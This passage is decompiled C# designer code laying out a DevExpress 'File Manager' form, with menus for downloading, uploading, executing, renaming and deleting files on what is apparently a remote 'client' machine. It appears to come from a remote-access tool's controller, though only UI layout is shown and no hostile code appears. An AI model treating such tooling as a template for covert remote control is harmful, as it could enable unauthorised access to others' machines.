		this.UnzipMenu.Id = 16;
		this.UnzipMenu.Name = "UnzipMenu";
		this.UnzipMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(UnzipMenu_ItemClick);
		this.MakeNewFolderMenu.Caption = "New Folder";
		this.MakeNewFolderMenu.Id = 11;
		this.MakeNewFolderMenu.Name = "MakeNewFolderMenu";
		this.MakeNewFolderMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(MakeNewFolderMenu_ItemClick);
		this.OpenClientFolderMenu.Caption = "Open Client folder";
		this.OpenClientFolderMenu.Id = 12;
		this.OpenClientFolderMenu.Name = "OpenClientFolderMenu";
		this.OpenClientFolderMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(OpenClientFolderMenu_ItemClick);
		this.barManager1.DockControls.Add(this.barDockControlTop);
		this.barManager1.DockControls.Add(this.barDockControlBottom);
		this.barManager1.DockControls.Add(this.barDockControlLeft);
		this.barManager1.DockControls.Add(this.barDockControlRight);
		this.barManager1.Form = this;
		this.barManager1.Items.AddRange(new DevExpress.XtraBars.BarItem[21]
		{
			this.BackMenu, this.RefreshMenu, this.barSubItem1, this.DownloadMenu, this.UploadMenu, this.ExecuteMenu, this.RenameMenu, this.CopyMenu, this.CutMenu, this.PasteMenu,
			this.barSubItem2, this.MakeNewFolderMenu, this.OpenClientFolderMenu, this.GotoDesktopMenu, this.InstallZipMenu, this.ZipFolderMenu, this.UnzipMenu, this.GotoAppDataMenu, this.GotoUserProfileMenu, this.GotoDriversMenu,
			this.DeleteMenu
		});
		this.barManager1.MaxItemId = 21;
		this.barDockControlTop.CausesValidation = false;
		this.barDockControlTop.Dock = System.Windows.Forms.DockStyle.Top;
		this.barDockControlTop.Location = new System.Drawing.Point(0, 0);
		this.barDockControlTop.Manager = this.barManager1;
		this.barDockControlTop.Size = new System.Drawing.Size(822, 0);
		this.barDockControlBottom.CausesValidation = false;
		this.barDockControlBottom.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.barDockControlBottom.Location = new System.Drawing.Point(0, 436);
		this.barDockControlBottom.Manager = this.barManager1;
		this.barDockControlBottom.Size = new System.Drawing.Size(822, 0);
		this.barDockControlLeft.CausesValidation = false;
		this.barDockControlLeft.Dock = System.Windows.Forms.DockStyle.Left;
		this.barDockControlLeft.Location = new System.Drawing.Point(0, 0);
		this.barDockControlLeft.Manager = this.barManager1;
		this.barDockControlLeft.Size = new System.Drawing.Size(0, 436);
		this.barDockControlRight.CausesValidation = false;
		this.barDockControlRight.Dock = System.Windows.Forms.DockStyle.Right;
		this.barDockControlRight.Location = new System.Drawing.Point(822, 0);
		this.barDockControlRight.Manager = this.barManager1;
		this.barDockControlRight.Size = new System.Drawing.Size(0, 436);
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(822, 410);
		this.xtraTabControl1.TabIndex = 7;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.listViewExplorer);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(820, 379);
		base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(822, 436);
		base.Controls.Add(this.xtraTabControl1);
		base.Controls.Add(this.statusStrip1);
		base.Controls.Add(this.barDockControlLeft);
		base.Controls.Add(this.barDockControlRight);
		base.Controls.Add(this.barDockControlBottom);
		base.Controls.Add(this.barDockControlTop);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormFileManager.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormFileManager.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormFileManager";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "File Manager";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormFileManager_FormClosed);
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.popupMenuFileManager).EndInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
